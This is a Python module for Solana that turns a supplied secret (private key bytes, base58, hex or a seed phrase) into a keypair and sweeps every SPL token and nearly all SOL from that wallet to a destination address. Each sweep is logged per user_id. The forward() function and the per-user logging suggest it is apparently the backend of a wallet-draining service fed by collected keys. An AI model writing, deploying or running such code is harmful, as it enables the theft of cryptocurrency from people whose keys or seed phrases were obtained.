import base58
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.system_program import transfer, TransferParams
from solana.rpc.api import Client
from solana.rpc.types import TxOpts
from solders.transaction import Transaction
from config import SOLANA_RPC_URL

client = Client(SOLANA_RPC_URL)

LAMPORTS_PER_SOL = 1_000_000_000
MIN_RENT         = 890_880
FEE_BUFFER       = 15_000
TOKEN_PROGRAM    = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
ATA_PROGRAM      = Pubkey.from_string("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1bT7")
SPL_MEMO_PID     = Pubkey.from_string("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr")

def keypair_from_secret(secret: str) -> Keypair:
    s = secret.strip()
    if "," in s:
        return Keypair.from_bytes(bytes(map(int, s.split(","))))
    try:
        raw = base58.b58decode(s)
        if len(raw) == 64:
            return Keypair.from_bytes(raw)
        if len(raw) == 32:
            return Keypair.from_seed(raw)
    except Exception:
        pass
    if len(s.split()) >= 12:
        try:
            from mnemonic import Mnemonic
            seed = Mnemonic("english").to_seed(s)[:32]
            return Keypair.from_seed(seed)
        except Exception:
            pass
    return Keypair.from_bytes(bytes.fromhex(s))

def get_balance(address: str) -> float:
    try:
        return client.get_balance(Pubkey.from_string(address)).value / LAMPORTS_PER_SOL
    except Exception:
        return 0.0

def _get_ata(wallet: Pubkey, mint: Pubkey) -> Pubkey:
    """Derive associated token account address."""
    seeds = [bytes(wallet), bytes(TOKEN_PROGRAM), bytes(mint)]
    from solders.pubkey import Pubkey as P
    ata, _ = P.find_program_address(seeds, ATA_PROGRAM)
    return ata

def sweep_spl_tokens(keypair: Keypair, destination: str, user_id: int) -> list:
    """Find all SPL token accounts and sweep them to destination."""
    results = []
    from_pubkey = keypair.pubkey()
    dest_pubkey = Pubkey.from_string(destination)

    try:
        resp = client.get_token_accounts_by_owner_json_parsed(
            from_pubkey,
            {"programId": str(TOKEN_PROGRAM)},
        )
        accounts = resp.value
    except Exception as e:
        print(f"[SOL SPL] Failed to get token accounts: {e}")
        return results

    for acc in accounts:
        try:
            parsed = acc.account.data.parsed
            info   = parsed["info"]
            mint_str  = info["mint"]
            token_amount = info["tokenAmount"]
            ui_amount = float(token_amount.get("uiAmount") or 0)
            raw_amount = int(token_amount.get("amount", 0))

            if raw_amount == 0:
                continue

            mint_pubkey = Pubkey.from_string(mint_str)
            src_ata     = Pubkey.from_string(str(acc.pubkey))
            dest_ata    = _get_ata(dest_pubkey, mint_pubkey)

            # Check if destination ATA exists; if not, create it
            dest_ata_info = client.get_account_info(dest_ata).value
            instructions = []

            if dest_ata_info is None:
                # Build create_associated_token_account instruction manually
                from solders.instruction import Instruction, AccountMeta
                keys = [
                    AccountMeta(pubkey=from_pubkey, is_signer=True, is_writable=True),
                    AccountMeta(pubkey=dest_ata, is_signer=False, is_writable=True),
                    AccountMeta(pubkey=dest_pubkey, is_signer=False, is_writable=False),
                    AccountMeta(pubkey=mint_pubkey, is_signer=False, is_writable=False),
                    AccountMeta(pubkey=Pubkey.from_string("11111111111111111111111111111111"), is_signer=False, is_writable=False),
                    AccountMeta(pubkey=TOKEN_PROGRAM, is_signer=False, is_writable=False),
                ]
                create_ix = Instruction(ATA_PROGRAM, b"", keys)
                instructions.append(create_ix)

            # SPL transfer instruction
            from spl.token.instructions import transfer_checked, TransferCheckedParams
            decimals = int(token_amount.get("decimals", 9))
            transfer_ix = transfer_checked(TransferCheckedParams(
                program_id=TOKEN_PROGRAM,
                source=src_ata,
                mint=mint_pubkey,
                dest=dest_ata,
                owner=from_pubkey,
                amount=raw_amount,
                decimals=decimals,
                signers=[],
            ))
            instructions.append(transfer_ix)

            blockhash = client.get_latest_blockhash().value.blockhash
            tx = Transaction.new_signed_with_payer(
                instructions,
                payer=from_pubkey,
                signing_keypairs=[keypair],
                recent_blockhash=blockhash,
            )

            resp2 = client.send_transaction(tx, opts=TxOpts(skip_confirmation=False, preflight_commitment="confirmed"))
            sig = str(resp2.value)

            results.append({
                "asset": mint_str[:8] + "...",
                "asset_full": mint_str,
                "status": "success",
                "amount": ui_amount,
                "tx_hash": sig,
                "error": None,
            })
            print(f"[SOL SPL] Swept {ui_amount} of mint {mint_str[:12]}... sig={sig[:12]}... user={user_id}")

        except Exception as e:
            err = str(e)
            if "insufficient" not in err.lower():
                print(f"[SOL SPL ERROR] {err[:100]}")
            results.append({
                "asset": "SPL",
                "status": "error",
                "amount": 0,
                "tx_hash": None,
                "error": err[:120],
            })

    return results

def forward(secret: str, destination: str, user_id: int) -> list:
    results = []
    try:
        keypair = keypair_from_secret(secret)
        from_pubkey = keypair.pubkey()
        to_pubkey   = Pubkey.from_string(destination)

        # 1. Sweep SPL tokens first
        spl_results = sweep_spl_tokens(keypair, destination, user_id)
        for r in spl_results:
            results.append({"chain": "solana", **r})

        # 2. Sweep native SOL
        balance = client.get_balance(from_pubkey).value
        send_amount = balance - MIN_RENT - FEE_BUFFER

        if send_amount <= 0:
            results.append({
                "chain": "solana", "asset": "SOL", "status": "skip",
                "amount": balance / LAMPORTS_PER_SOL,
                "tx_hash": None,
                "error": f"Balance {balance/LAMPORTS_PER_SOL:.6f} SOL too low",
            })
            return results

        amount_sol = send_amount / LAMPORTS_PER_SOL
        blockhash  = client.get_latest_blockhash().value.blockhash

        tx = Transaction.new_signed_with_payer(
            [transfer(TransferParams(from_pubkey=from_pubkey, to_pubkey=to_pubkey, lamports=send_amount))],
            payer=from_pubkey,
            signing_keypairs=[keypair],
            recent_blockhash=blockhash,
        )

        resp = client.send_transaction(tx, opts=TxOpts(skip_confirmation=False, preflight_commitment="confirmed"))
        sig  = str(resp.value)

        results.append({
            "chain": "solana", "asset": "SOL", "status": "success",
            "amount": amount_sol, "tx_hash": sig, "error": None,
        })
        print(f"[SOL] Swept {amount_sol:.6f} SOL user={user_id} sig={sig[:14]}...")

    except Exception as e:
        results.append({
            "chain": "solana", "asset": "SOL", "status": "error",
            "amount": 0, "tx_hash": None, "error": str(e)[:200],
        })
        print(f"[SOL ERROR] user={user_id}: {e}")

    return results
